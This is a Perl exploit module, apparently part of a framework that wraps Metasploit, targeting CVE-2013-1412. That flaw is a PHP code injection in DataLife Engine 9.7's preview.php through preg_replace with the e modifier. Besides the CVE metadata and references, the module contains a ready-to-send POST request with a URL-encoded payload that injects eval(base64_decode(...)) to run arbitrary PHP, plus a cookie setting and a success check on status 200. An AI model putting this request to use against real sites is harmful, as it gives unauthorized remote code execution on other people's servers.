package DATALIFE::MSF::DatalifePreviewExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "DatalifePreviewExec";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2013-1412",
  DESCRIPTION => "

          This module exploits a PHP code injection vulnerability DataLife Engine 9.7.

        The vulnerability exists in preview.php, due to an insecure usage of preg_replace()

        with the e modifier, which allows to inject arbitrary php code, when there is a

        template installed which contains a [catlist] or [not-catlist] tag, even when the

        template isn't in use currently. The template can be configured with the TEMPLATE

        datastore option.

      ",
  MSF_MODULE => "datalife_preview_exec",
  OSVDB => 89662,
  REFERENCES => [
    "http://karmainsecurity.com/KIS-2013-01",
    "http://dleviet.com/dle/bug-fix/3281-security-patches-for-dle-97.html",
  ],
  TITLE => "DataLife Engine preview.php PHP Code Injection",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'engine/preview.php',
      PAYLOAD      => 'catlist%5b0%5d=VEHg%27%29%7c%7ceval%28base64_decode%28%22X19QQVlMT0FEX18%3d%22%29%29%3b//',
      TEXT   => 'Sending Exploit #1 Request : [POST] /engine/preview.php',
      HEADERS      => {
        'Cookie' => 'dle_skin=Default',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
